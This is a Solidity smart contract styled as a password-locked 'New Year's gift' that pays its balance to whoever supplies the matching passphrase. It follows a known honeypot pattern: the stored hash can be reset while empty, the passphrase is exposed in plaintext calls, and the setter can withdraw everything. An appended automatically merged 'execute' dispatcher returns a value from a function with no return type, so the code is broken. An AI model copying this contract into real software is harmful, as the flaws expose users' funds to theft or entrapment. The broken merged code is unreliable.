pragma solidity ^0.4.19;

contract NEW_YEARS_GIFT
{
    string message;

    bool passHasBeenSet = false;

    address sender;

    bytes32 public hashPass;

    function() public payable{}

    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}

    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
        }
    }

    function SetMessage(string _message)
    public
    {
        if(msg.sender==sender)
        {
            message =_message;
        }
    }

    function GetGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
            return message;
        }
    }

    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
            message="";
        }
    }

    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(msg.sender==sender&&hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }

    // Unified dispatcher - merged from: GetHash, SetPass, SetMessage
    // Selectors: GetHash=0, SetPass=1, SetMessage=2
    function execute(uint8 _selector, bytes pass, bytes32 hash, string _message) public payable {
        // Original: GetHash()
        if (_selector == 0) {
            return sha3(pass);
        }
        // Original: SetPass()
        else if (_selector == 1) {
            if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
            {
            hashPass = hash;
            sender = msg.sender;
            }
        }
        // Original: SetMessage()
        else if (_selector == 2) {
            if(msg.sender==sender)
            {
            message =_message;
            }
        }
    }
}